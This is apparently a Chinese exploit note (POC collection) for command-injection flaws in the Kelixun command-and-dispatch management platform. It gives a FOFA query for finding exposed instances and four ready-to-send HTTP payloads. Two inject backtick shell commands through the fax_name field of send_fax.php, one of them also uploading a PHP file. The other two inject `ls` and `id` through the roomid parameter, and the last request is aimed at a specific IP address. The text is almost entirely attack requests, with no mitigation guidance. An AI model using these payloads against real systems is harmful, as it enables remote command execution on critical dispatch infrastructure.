# 福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞

    ## fofa

```
body="指挥调度管理平台"
```

## Exp1 api/client/fax/send_fax.php

```
api/client/fax/send_fax.php

 Content-Type: multipart/form-data; boundary=---------------------------237165270837920818671657226783
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/99.0.2425.64 Safari/537.36
    data: "-----------------------------237165270837920818671657226783\nContent-Disposition:\
      \ form-data; name=\"fax_extention\"\n\n1\n-----------------------------237165270837920818671657226783\n\
      Content-Disposition: form-data; name=\"fax_name\"\n\n`ping {{dnsip}}`.pdf\n\
      -----------------------------237165270837920818671657226783\nContent-Disposition:\
      \ form-data; name=\"sendfile\"; filename=\"phpinfo.avi\"\nContent-Type: video/avi\n\
      \n<?php\nphpinfo();\n\n?>\n-----------------------------237165270837920818671657226783\n\
      Content-Disposition: form-data; name=\"submit\"\n\nSubmit\n-----------------------------237165270837920818671657226783—"
```

## exp2 custom/zx/fax/send_fax.php

```
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/57.0.369.79 Safari/537.36
      Content-Type: multipart/form-data; boundary=---------------------------237165270837920818671657226783
    data: "-----------------------------237165270837920818671657226783\nContent-Disposition:\
      \ form-data; name=\"fax_extention\"\n\n1\n-----------------------------237165270837920818671657226783\n\
      Content-Disposition: form-data; name=\"fax_name\"\n\n`ping {{dnsip}}`.pdf\n\
      -----------------------------237165270837920818671657226783\nContent-Disposition:\
      \ form-data; name=\"sendfile\"; filename=\"phpinfo.avi\"\nContent-Type: video/avi\n\
      \n1\n-----------------------------237165270837920818671657226783\nContent-Disposition:\
      \ form-data; name=\"submit\"\n\nSubmit\n-----------------------------237165270837920818671657226783—"
```

## exp3 api/client/autobridgecall.php

```
api/client/autobridgecall.php?callee=1&roomid=`ls>1.txt`
```

## Exp4 invite_one_member.php

```
GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt` HTTP/1.1
Host: 111.21.226.162:7080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=f3b775b1f757845ed540428144c2c797
Connection: close

```
